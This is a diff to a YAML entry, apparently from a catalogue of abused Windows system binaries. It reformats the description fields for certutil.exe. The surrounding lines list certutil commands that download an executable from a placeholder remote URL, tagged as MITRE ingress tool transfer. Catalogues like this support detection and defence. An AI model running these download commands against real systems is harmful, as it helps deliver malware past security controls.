@@ -12,7 +12,7 @@ Commands:
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}
-    Description: Download and save an executable to disk in the current folder when a file path is specified, or %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\[hash] when not.
+    Description: Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\{hash}` when not.
     Usecase: Download file from Internet
     Category: Download
     Privileges: User
@@ -26,7 +26,7 @@ Commands:
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: certutil.exe -URL {REMOTEURL:.exe}
-    Description: Download and save an executable to %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\[hash].
+    Description: Download and save an executable to `%LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\{hash}`.
     Usecase: Download file from Internet
     Category: Download
     Privileges: User
